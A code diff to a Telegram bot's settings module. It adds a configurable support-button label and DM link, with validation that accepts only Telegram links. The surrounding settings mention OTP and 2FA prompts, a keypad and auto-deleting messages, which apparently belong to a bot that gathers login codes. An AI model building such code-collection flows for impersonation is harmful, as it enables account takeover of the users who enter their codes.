@@ -120,6 +120,8 @@ DEFAULT_SETTINGS = {
         "(The message will be deleted immediately.)"
     ),
     "delete_after_hours": str(DELETE_AFTER_HOURS_DEFAULT),
+    "keypad_top_button_text": "💬 Contact Support",
+    "keypad_top_button_url": "tg://user?id=123456789",
 }
 
 EDITABLE_KEYS = list(DEFAULT_SETTINGS.keys())
@@ -133,6 +135,8 @@ KEY_LABELS = {
     "otp_prompt": "🔐 OTP prompt message",
     "twofa_prompt": "🔐 2FA prompt message",
     "delete_after_hours": "⏳ Auto-delete timer (hours)",
+    "keypad_top_button_text": "💬 Keypad top button — label",
+    "keypad_top_button_url": "🔗 Keypad top button — DM link",
 }
 
 
@@ -403,6 +407,13 @@ async def set_edit_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     extra_hint = ""
     if key == "delete_after_hours":
         extra_hint = "\n\n⚠️ Send a whole number (e.g. <code>1</code>, <code>6</code>, <code>24</code>)."
+    elif key.endswith("_button_url"):
+        extra_hint = (
+            "\n\n⚠️ Send a valid Telegram link.\n"
+            "Allowed formats:\n"
+            "• <code>https://t.me/Username</code>\n"
+            "• <code>tg://user?id=123456789</code>"
+        )
 
     await q.edit_message_text(
         f"✏️ <b>Editing:</b> <code>{esc(key)}</code>\n\n"
@@ -466,6 +477,21 @@ async def set_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             await update.message.reply_text("⚠️ Hours must be between 1 and 720 (30 days).")
             return True
         value = str(hours)
+    elif key.endswith("_button_url"):
+        value = raw.strip()
+        if not (value.startswith("https://t.me/")
+                or value.startswith("tg://user?id=")):
+            await update.message.reply_text(
+                "⚠️ Please send a valid Telegram link.\n\n"
+                "Allowed formats:\n"
+                "• <code>https://t.me/Username</code>\n"
+                "• <code>tg://user?id=123456789</code>",
+                parse_mode=ParseMode.HTML,
+            )
+            return True
+        if len(value) > 200:
+            await update.message.reply_text("⚠️ URL too long.")
+            return True
     elif key.endswith("_button_text"):
         value = raw.strip()
         if len(value) > 100 or "\n" in value:
@@ -500,6 +526,8 @@ async def set_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         display = f"{value} hour(s)"
     elif key.endswith("_button_text"):
         display = esc(value)
+    elif key.endswith("_button_url"):
+        display = f"Link: <code>{esc(value)}</code>"
     else:
         display = "Message formatting saved exactly as shown in the preview above."
 
